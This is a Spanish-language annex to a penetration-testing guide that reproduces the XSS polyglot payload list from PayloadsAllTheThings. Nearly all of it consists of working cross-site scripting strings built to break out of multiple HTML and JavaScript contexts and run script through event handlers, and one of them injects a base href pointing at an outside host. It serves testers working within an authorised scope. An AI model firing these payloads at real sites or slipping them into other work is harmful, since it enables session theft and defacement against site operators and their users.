# Cross-Site Scripting (XSS): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [XSS Injection/2 - XSS Polyglot.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XSS%20Injection/2%20-%20XSS%20Polyglot.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Polyglot XSS

```javascript
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```javascript
    ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

```javascript
    " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

```javascript
    ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

```javascript
    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
    javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
    javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
    javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
    javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
    javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
    javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
    javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
    --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
    /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
    javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
    /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

```text
![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)
```

```javascript
    -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

```text
![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)
```

```javascript
    <svg%0Ao%00nload=%09((pro\u006dpt))()//
```

```javascript
    // Author: crlf
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

    // Author: europa
    javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

    // Author: EdOverflow
    javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

    // Author: h1/ragnar
    javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
```

```javascript
    JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
